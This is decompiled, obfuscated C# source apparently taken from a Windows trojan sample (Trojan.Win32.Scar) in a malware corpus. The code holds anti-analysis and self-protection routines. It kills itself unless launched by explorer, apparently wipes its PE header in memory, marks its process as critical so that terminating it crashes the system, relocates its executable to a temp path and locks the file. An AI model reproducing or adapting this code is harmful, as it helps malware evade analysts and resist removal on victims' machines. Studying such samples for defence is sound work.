// Decompiled with JetBrains decompiler
// Type: ᭂ൱ễᯧ੻ಱាᮇᢑښᖡኞ׼ด.ἰسພᲭᓚဥḱݭཽഥވॱḉኯ
// Assembly: trraaa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 832C03EF-4027-4148-8669-9B38E84E6716
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Scar.mtzz-552836309c43a6339ff0b708baff33dc65ab36ff3b98038d01dbd0c96ae605cc.exe

using \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด
{
  public static class ἰسພ\u1CADᓚဥḱݭཽഥ\u0008ވॱḉኯ
  {
    private static FileStream \u0948ຊտД\u09CF;

    public static void ᐑᒩཝ࡚ᙌᐕ\u02EBᖉ()
    {
      if (ᥘĘᛢᛅкPӝ\u0885၁.نᥐṷᒁΩ)
        ἰسພ\u1CADᓚဥḱݭཽഥ\u0008ވॱḉኯ.ᅁᬕᵡᙲǛড়ᷟৡᝲĳ\u0A4F\u0A37ᄉ\u109Eك();
      if (ᥘĘᛢᛅкPӝ\u0885၁.\u1CBCᗸ\u1CAAᙴẹ\u0D84᱕åᵂ && !ἰسພ\u1CADᓚဥḱݭཽഥ\u0008ވॱḉኯ.\u1ABFཙڨྛோẕϪ௧)
        Process.GetCurrentProcess().Kill();
      if (!ᥘĘᛢᛅкPӝ\u0885၁.\u0C42ᐗ\u0EE4\u08BAᥧᜬ̖੩ᚵኯẺ)
        return;
      ἰسພ\u1CADᓚဥḱݭཽഥ\u0008ވॱḉኯ.ᰟ\u0D5Aീᔷຍᅺ();
    }

    public static void ᅁᬕᵡᙲǛড়ᷟৡᝲĳ\u0A4F\u0A37ᄉ\u109Eك()
    {
      try
      {
        IntPtr num = ᶌᡆᖕ\u0FCAᅻᶋઋեΛҔ\u098E\u0BF8.\u180Bᛍᘔˁ͊ኖᔔፐᶚᘓᱻᖡ\u0B04ٝкᛋ\u083Dใၘ((string) null);
        ᶌᡆᖕ\u0FCAᅻᶋઋեΛҔ\u098E\u0BF8.\u0DE9Μ\u09A9ޫ\u0EBAᵉၙѧǦڧ\u0878(num, 512U, 4U, out uint _);
        ᶌᡆᖕ\u0FCAᅻᶋઋեΛҔ\u098E\u0BF8.ࢥୡ\u00BEစဒտᗒᥑᬈ\u196Fψ᪽ĺ०ᘐᐌ੮ᗇ(num, (IntPtr) 512);
      }
      catch
      {
      }
    }

    public static void ᰟ\u0D5Aീᔷຍᅺ()
    {
      try
      {
        int num = 1;
        ᶌᡆᖕ\u0FCAᅻᶋઋեΛҔ\u098E\u0BF8.\u0B64\u18F9ൟ\u0875᪱\u1AC3\u02D4༩᳜ĤዤᝍޗᘠỲښᎬ(Process.GetCurrentProcess().Handle, 29, ref num, 4);
      }
      catch
      {
      }
    }

    public static bool \u1ABFཙڨྛோẕϪ௧
    {
      get
      {
        using (ManagementObject managementObject = new ManagementObject("win32_process.handle='" + Process.GetCurrentProcess().Id.ToString() + "'"))
        {
          managementObject.Get();
          return !(Process.GetProcessById(Convert.ToInt32(managementObject["ParentProcessId"])).ProcessName.ToLower() != "explorer");
        }
      }
    }

    public static void Ⴍ᠘ࣵᡒ០\u0DFAᴬת\u0BE5\u1A9Cᛛ͇ᛂඕؽ()
    {
      try
      {
        ἰسພ\u1CADᓚဥḱݭཽഥ\u0008ވॱḉኯ.ጹᰤᗨઊ᪳ӑሤᡂሓጎ();
        string tempFileName = Path.GetTempFileName();
        File.Delete(tempFileName);
        string destFileName = tempFileName.Replace(".tmp", ".exe");
        File.Move(Process.GetCurrentProcess().MainModule.FileName, destFileName);
        ἰسພ\u1CADᓚဥḱݭཽഥ\u0008ވॱḉኯ.\u032Aƣຽً᷊ιੳ();
      }
      catch
      {
      }
    }

    public static void \u032Aƣຽً᷊ιੳ()
    {
      try
      {
        ἰسພ\u1CADᓚဥḱݭཽഥ\u0008ވॱḉኯ.\u0948ຊտД\u09CF = File.Open(Process.GetCurrentProcess().MainModule.FileName, FileMode.Open, FileAccess.Read, FileShare.None);
      }
      catch
      {
      }
    }

    public static void ጹᰤᗨઊ᪳ӑሤᡂሓጎ()
    {
      if (ἰسພ\u1CADᓚဥḱݭཽഥ\u0008ވॱḉኯ.\u0948ຊտД\u09CF == null)
        return;
      ἰسພ\u1CADᓚဥḱݭཽഥ\u0008ވॱḉኯ.\u0948ຊտД\u09CF.Close();
      ἰسພ\u1CADᓚဥḱݭཽഥ\u0008ވॱḉኯ.\u0948ຊտД\u09CF = (FileStream) null;
    }
  }
}
